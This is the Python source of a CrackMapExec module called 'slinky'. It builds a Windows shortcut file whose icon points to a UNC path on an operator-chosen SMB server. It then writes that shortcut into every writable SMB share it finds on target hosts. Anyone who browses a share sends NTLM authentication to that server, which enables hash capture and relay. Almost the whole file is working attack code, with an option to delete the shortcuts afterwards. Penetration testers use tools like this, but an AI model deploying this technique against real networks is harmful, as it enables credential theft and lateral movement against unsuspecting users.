import pylnk3
import os
import ntpath
from sys import exit

class CMEModule:
    '''
        Original idea and PoC by Justin Angel (@4rch4ngel86)
        Module by @byt3bl33d3r
    '''

    name = 'slinky'
    description = 'Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        SERVER        IP of the SMB server
        NAME          LNK file name
        CLEANUP       Cleanup (choices: True or False)
        '''

        self.cleanup = False

        if 'CLEANUP' in module_options:
            self.cleanup = bool(module_options['CLEANUP'])

        if 'NAME' not in module_options:
            context.log.error('NAME option is required!')
            exit(1)

        if not self.cleanup and 'SERVER' not in module_options:
            context.log.error('SERVER option is required!')
            exit(1)

        self.lnk_name   = module_options['NAME']
        self.lnk_path  = '/tmp/{}.lnk'.format(self.lnk_name)
        self.file_path = ntpath.join('\\', '{}.lnk'.format(self.lnk_name))

        if not self.cleanup:
            self.server = module_options['SERVER']
            link = pylnk3.create(self.lnk_path)
            link.icon = '\\\\{}\\icons\\icon.ico'.format(self.server)
            link.save()

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if 'WRITE' in share['access'] and share['name'] not in ['C$', 'ADMIN$']:
                context.log.success('Found writable share: {}'.format(share['name']))
                if not self.cleanup:
                    with open(self.lnk_path, 'rb') as lnk:
                        try:
                            connection.conn.putFile(share['name'], self.file_path, lnk.read)
                            context.log.success('Created LNK file on the {} share'.format(share['name']))
                        except Exception as e:
                            context.log.error('Error writing LNK file to share {}: {}'.format(share['name'], e))
                else:
                    try:
                        connection.conn.deleteFile(share['name'], self.file_path)
                        context.log.success('Deleted LNK file on the {} share'.format(share['name']))
                    except Exception as e:
                        context.log.error('Error deleting LNK file on share {}: {}'.format(share['name'], e))
